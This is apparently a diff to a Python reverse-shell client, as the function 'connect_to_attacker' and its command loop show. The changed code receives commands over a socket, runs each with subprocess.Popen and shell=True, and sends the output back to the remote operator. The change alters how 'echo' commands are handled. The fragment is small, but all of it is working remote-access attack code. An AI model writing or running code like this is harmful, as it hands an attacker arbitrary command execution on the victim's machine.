@@ -36,12 +36,14 @@ def get_command():
             except:
                 continue
         elif command[:4] == 'echo' and len(command) > 1:
-            msg = command[:5]
+            subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            msg = "echo successfully !!"
             sock.send(msg.encode())
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
             sock.send(result)
+            continue
 
 def connect_to_attacker():
     global sock
